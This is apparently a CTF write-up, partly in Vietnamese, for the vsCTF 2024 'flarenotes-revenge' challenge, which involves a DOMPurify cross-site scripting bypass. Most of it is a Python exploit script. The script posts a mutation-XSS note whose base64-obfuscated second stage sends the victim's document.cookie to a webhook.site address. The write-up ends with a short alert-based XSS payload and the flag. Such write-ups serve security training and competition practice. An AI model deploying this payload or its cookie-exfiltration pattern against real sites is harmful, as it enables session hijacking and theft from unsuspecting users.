# flarenotes-revenge

![image](https://github.com/LDV-SpaceK/vsCTF2024/assets/152776722/119ed912-85c9-449a-be17-9eae8844d38e)


- Recon

 => dạng này là xss DOMPurify 

 


![photo_2024-06-18_06-36-41](https://github.com/j10nelop/m3d1r/assets/152776722/db6cea54-8728-4d48-910e-ebff0f0947a6)


```
import requests as _requests, base64

requests = _requests.Session()
# poison self
req = requests.get("https://flarenotes.vsc.tf/
")
user_id = req.content.split(b"?user=")[1].split(b"\"")[0].decode()
print("user_id", user_id)

req = requests.get("https://flarenotes.vsc.tf/
")
user_id = req.content.split(b"?user=")[1].split(b"\"")[0].decode()
print("user_id", user_id)

second_stage = """var i=new Image(); i.src="https://webhook.site/6268ac05-3100-47b9-bcb7-f29338474397/?cookie="+btoa(document.cookie)
;
"""

payload = f"""<img class="asdf
<img src onerror=eval(atob('{base64.b64encode(second_stage.encode()).decode()}'))>"/>"""
print("payload:", payload)
req = requests.post("https://flarenotes.vsc.tf/add_note
", data={"note": payload})

print(f"https://flarenotes.vsc.tf/view/?user={user_id}", req.content)
```

=> payload xss khi ta cắt thẻ <a herf="abc"<img src = x onerror = alert(document.domain)>"></a>

![image](https://github.com/LDV-SpaceK/vsCTF2024/assets/152776722/307d5050-090f-469e-a267-ebebccc84701)



=> flag: vsctf(shouldnt_h4v3_us3d_cr1mefi4r3}
